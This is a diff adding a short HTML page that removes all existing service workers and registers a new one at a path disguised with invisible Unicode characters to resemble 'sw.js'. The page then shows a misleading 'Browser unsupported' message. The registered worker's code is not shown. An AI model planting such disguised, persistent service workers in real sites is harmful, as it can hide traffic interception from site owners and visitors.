@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<link rel="icon" type="image/svg+xml" href="data:" />
+<p>Loading...</p>
+<script>
+  (async () => {
+    await navigator.serviceWorker.getRegistrations().then((registrations) => {
+      return Promise.all(registrations.map((registration) => registration.unregister()));
+    });
+    await navigator.serviceWorker.register("/s\u2065w.j\u2065s");
+
+    setTimeout(() => {
+      document.querySelector("p").textContent = "Browser unsupported.";
+    }, 1000);
+  })().catch((error) => {
+    console.error("Service worker registration failed", error);
+  });
+</script>
